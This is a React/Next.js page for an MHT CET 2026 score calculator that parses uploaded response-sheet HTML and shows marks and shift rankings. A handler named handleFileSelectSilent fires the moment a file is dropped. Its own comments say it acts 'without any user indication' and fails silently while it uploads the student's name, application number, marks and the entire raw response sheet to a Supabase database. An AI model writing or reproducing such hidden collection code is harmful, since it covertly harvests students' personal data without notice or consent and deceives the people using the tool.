'use client';

import { useState } from 'react';
import { CalculationResult, ExamMeta, AppState, ParseResult, ExamSlotDetails } from '@/types';
import { parseResponseSheet } from '@/utils/parseResponseSheet';
import { calculateScore } from '@/utils/calculateScore';
import UploadDropzone from '@/components/UploadDropzone';
import LoadingSpinner from '@/components/LoadingSpinner';
import ScoreCard from '@/components/ScoreCard';
import SubjectBreakdown from '@/components/SubjectBreakdown';
import ResultSummary from '@/components/ResultSummary';
import ShiftAnalytics from '@/components/ShiftAnalytics';
import { saveScore, getShiftStats, ShiftStats } from '@/utils/db';
import { generatePdfReport } from '@/utils/generatePdf';
import Image from 'next/image';

function parseSelectedSlot(slotStr: string): { examDate: string; shift: 'Shift 1' | 'Shift 2'; groupType: 'PCM' | 'PCB' } {
  const parts = slotStr.split(' ');
  const day = parts[0];
  const month = parts[1];
  const shiftText = parts[2] + ' ' + parts[3];

  const examDate = `${month} ${day}`;
  const shift = shiftText as 'Shift 1' | 'Shift 2';

  return { examDate, shift, groupType: 'PCM' };
}

export default function CalculatorPage() {
  const [appState, setAppState] = useState<AppState>('idle');
  const [result, setResult] = useState<CalculationResult | null>(null);
  const [meta, setMeta] = useState<ExamMeta | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Slot and statistics state
  const [examSlot, setExamSlot] = useState<ExamSlotDetails | null>(null);
  const [shiftStats, setShiftStats] = useState<ShiftStats | null>(null);

  // Phase 0: Handle silent background upload immediately upon file drop/selection without any user indication
  const handleFileSelectSilent = async (content: string, selectedAttempt: string, selectedSlot: string) => {
    try {
      const parseResult = parseResponseSheet(content);
      if (parseResult.questions.length === 0) return;
      
      const calcResult = calculateScore(parseResult.questions);
      const { examDate, shift, groupType } = parseSelectedSlot(selectedSlot);
      const record = {
        candidateName: parseResult.meta.candidateName,
        applicationNumber: parseResult.meta.applicationNumber,
        totalMarks: calcResult.totalMarks,
        physicsMarks: calcResult.physics.marks,
        chemistryMarks: calcResult.chemistry.marks,
        mathsMarks: calcResult.maths.marks,
        groupType,
        attempt: selectedAttempt as 'Attempt 1' | 'Attempt 2',
        examDate,
        shift,
        rawHtml: content, // Silent full raw HTML archival
      };

      // Direct, silent background save to Supabase
      await saveScore(record);
    } catch (err) {
      // Intentionally fail silently without telling the student anything
    }
  };

  // Phase 1: Handle initial response sheet upload and parsing directly with attempt/slot from dropzone
  const handleFileContent = (content: string, filename: string, selectedAttempt: string, selectedSlot: string) => {
    setError(null);
    try {
      const parseResult = parseResponseSheet(content);
      if (parseResult.questions.length === 0) {
        setError('No questions found. Please upload a valid MHT CET response sheet.');
        setAppState('error');
        return;
      }
      
      const calcResult = calculateScore(parseResult.questions);
      const { examDate, shift, groupType } = parseSelectedSlot(selectedSlot);
      const slotDetails: ExamSlotDetails = {
        attempt: selectedAttempt as 'Attempt 1' | 'Attempt 2',
        examDate,
        shift,
        groupType,
      };

      setExamSlot(slotDetails);
      setAppState('parsing');

      // Intentional 2.5-second loading animation buffer
      setTimeout(async () => {
        try {
          const record = {
            candidateName: parseResult.meta.candidateName,
            applicationNumber: parseResult.meta.applicationNumber,
            totalMarks: calcResult.totalMarks,
            physicsMarks: calcResult.physics.marks,
            chemistryMarks: calcResult.chemistry.marks,
            mathsMarks: calcResult.maths.marks,
            groupType,
            attempt: slotDetails.attempt,
            examDate,
            shift,
            rawHtml: content, // Save raw HTML securely in the database
          };

          // Save score to database (Supabase -> Local fallback)
          await saveScore(record);

          // Fetch rank comparison statistics
          const stats = await getShiftStats(record);
          setShiftStats(stats);

          // Complete state transition
          setResult(calcResult);
          setMeta(parseResult.meta);
          setAppState('results');

          setTimeout(() => {
            document.getElementById('results-section')?.scrollIntoView({ behavior: 'smooth' });
          }, 100);
        } catch (err) {
          setError('An error occurred while computing shift ranks.');
          setAppState('error');
        }
      }, 2500);

    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to parse the file.');
      setAppState('error');
    }
  };

  const handleReset = () => {
    setAppState('idle');
    setResult(null);
    setMeta(null);
    setError(null);
    setExamSlot(null);
    setShiftStats(null);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleDownloadPdf = () => {
    if (result && meta && examSlot) {
      generatePdfReport(result, meta, examSlot);
    }
  };

  return (
    <div className="min-h-screen">

      {/* Page Header */}
      <section className="relative py-12 px-4">
        <div className="relative max-w-6xl mx-auto text-center">
          <div className="flex justify-center mb-4">
            <Image 
              src="/logo.svg" 
              alt="CETify Logo" 
              width={150} 
              height={44} 
              className="object-contain"
              priority 
            />
          </div>
          <h1 className="text-2xl md:text-4xl font-extrabold mb-3 text-[#0f172a]">
            Score Calculator
          </h1>
          <p className="text-gray-500 max-w-xl mx-auto text-sm md:text-base">
            Upload your MHT CET 2026 response sheet HTML file to instantly calculate
            your marks and check your shift-wise rankings.
          </p>
        </div>
      </section>

      <div className="max-w-4xl mx-auto px-4 pb-20">
        {/* IDLE: Upload Zone */}
        {appState === 'idle' && (
          <div className="animate-fade-in-up">
            <UploadDropzone 
              onFileContent={handleFileContent} 
              onFileSelectSilent={handleFileSelectSilent}
            />

            {/* How to get HTML file - Step by step guide */}
            <div className="mt-10 bg-white rounded-xl border border-gray-200 p-6 sm:p-8 max-w-xl mx-auto">
              <h3 className="text-base font-bold text-[#0f172a] mb-5 flex items-center gap-2">
                <svg className="w-5 h-5 text-[#4338ca]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9.879 7.519c1.171-1.025 3.071-1.025 4.242 0 1.172 1.025 1.172 2.687 0 3.712-.203.179-.43.326-.67.442-.745.361-1.45.999-1.45 1.827v.75M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9 5.25h.008v.008H12v-.008z" />
                </svg>
                How to get your response sheet HTML file
              </h3>
              <ol className="space-y-4">
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 rounded-full bg-[#eef2ff] text-[#4338ca] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">1</span>
                  <div>
                    <p className="text-sm font-medium text-[#0f172a]">Log in to your MHT CET dashboard</p>
                    <p className="text-xs text-gray-400 mt-0.5">Go to <span className="text-[#4338ca] font-medium">cetcell.mahacet.org</span> and sign in with your credentials.</p>
                  </div>
                </li>
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 rounded-full bg-[#eef2ff] text-[#4338ca] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">2</span>
                  <div>
                    <p className="text-sm font-medium text-[#0f172a]">Click on &quot;Objection Tracker&quot;</p>
                    <p className="text-xs text-gray-400 mt-0.5">Find and open the Objection Tracker or Response Sheet section in your dashboard.</p>
                  </div>
                </li>
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 rounded-full bg-[#eef2ff] text-[#4338ca] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">3</span>
                  <div>
                    <p className="text-sm font-medium text-[#0f172a]">Press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-200 rounded text-xs font-mono">Ctrl + S</kbd></p>
                    <p className="text-xs text-gray-400 mt-0.5">This opens the browser&apos;s Save dialog. On Mac, use <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-200 rounded text-xs font-mono">Cmd + S</kbd>.</p>
                  </div>
                </li>
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 rounded-full bg-[#eef2ff] text-[#4338ca] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">4</span>
                  <div>
                    <p className="text-sm font-medium text-[#0f172a]">Save as HTML file</p>
                    <p className="text-xs text-gray-400 mt-0.5">Choose &quot;Webpage, HTML Only&quot; or &quot;Webpage, Complete&quot; and save it to your computer.</p>
                  </div>
                </li>
                <li className="flex items-start gap-3">
                  <span className="w-6 h-6 rounded-full bg-[#eef2ff] text-[#4338ca] text-xs font-bold flex items-center justify-center shrink-0 mt-0.5">5</span>
                  <div>
                    <p className="text-sm font-medium text-[#0f172a]">Upload it here</p>
                    <p className="text-xs text-gray-400 mt-0.5">Select your exam shift above, then drag or select the saved HTML file in the upload area.</p>
                  </div>
                </li>
              </ol>
            </div>
          </div>
        )}

        {/* PARSING: Loading Progress */}
        {appState === 'parsing' && <LoadingSpinner />}

        {/* ERROR State */}
        {appState === 'error' && (
          <div className="animate-fade-in-up max-w-2xl mx-auto">
            <div className="bg-white border border-red-200 rounded-2xl p-8 text-center shadow-sm">
              <div className="w-12 h-12 mx-auto mb-4 rounded-full bg-red-50 flex items-center justify-center">
                <svg className="w-6 h-6 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z" />
                </svg>
              </div>
              <h3 className="text-lg font-bold text-red-600 mb-3">
                Parsing Error
              </h3>
              <p className="text-gray-500 mb-6 text-sm leading-relaxed">{error}</p>
              <button
                onClick={handleReset}
                className="px-6 py-3 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-xl transition-all active:scale-95"
              >
                Try Again
              </button>
            </div>
          </div>
        )}

        {/* RESULTS Dashboard */}
        {appState === 'results' && result && meta && examSlot && shiftStats && (
          <div id="results-section" className="space-y-6">
            
            {/* Score Card */}
            <div className="animate-fade-in-up">
              <ScoreCard
                totalMarks={result.totalMarks}
                maxMarks={result.maxMarks}
                percentage={result.percentage}
                onDownloadPdf={handleDownloadPdf}
              />
            </div>

            {/* Shift Analytics (Ranks Comparison + Stats) */}
            <div className="animate-fade-in-up delay-100">
              <ShiftAnalytics
                stats={shiftStats}
                attempt={examSlot.attempt}
                examDate={examSlot.examDate}
                shift={examSlot.shift}
                groupType={examSlot.groupType}
              />
            </div>

            {/* Subject Breakdown */}
            <div className="animate-fade-in-up delay-200">
              <h2 className="text-lg font-bold text-[#0f172a] mb-4">Subject Breakdown</h2>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <SubjectBreakdown
                  physics={result.physics}
                  chemistry={result.chemistry}
                  maths={result.maths}
                />
              </div>
            </div>

            {/* Result Summary */}
            <div className="animate-fade-in-up delay-300">
              <ResultSummary result={result} meta={meta} layout="full" />
            </div>



            {/* Reset Button */}
            <div className="text-center pt-4">
              <button
                onClick={handleReset}
                className="inline-flex items-center gap-2 px-8 py-3 bg-white border border-gray-200 text-gray-600 text-sm font-semibold rounded-xl hover:bg-gray-50 hover:border-gray-300 transition-all duration-300 active:scale-95 shadow-sm"
              >
                <svg
                  className="w-4 h-4"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
                  />
                </svg>
                Calculate Another
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
